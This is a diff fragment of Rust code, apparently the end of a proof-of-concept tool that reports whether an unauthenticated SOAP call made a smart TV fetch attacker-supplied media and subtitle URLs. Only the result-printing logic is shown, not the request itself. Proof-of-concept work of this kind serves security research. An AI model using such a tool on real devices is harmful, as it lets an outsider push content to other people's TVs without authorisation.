+            mb,
+            mb / (c.size as f64 / 1e6) * 100.0
+        );
+    }
+    if subs > 0 {
+        println!(
+            "\nPROVEN: an unauthenticated SOAP call made the TV fetch BOTH attacker-supplied\n\
+             URLs (media + subtitle) - arbitrary outbound fetch / content delivery, no auth.\n\
+             NOT proven by the network log alone: that the caption actually RENDERED."
+        );
+    } else if med > 0 {
+        println!("\nPARTIAL: the TV fetched our media but never the subtitle.");
+    } else {
+        println!("\nNo fetch at all - is the port reachable from the TV?");
+    }
+    println!("\nrun with --stop to stop playback + disable the caption");
+}
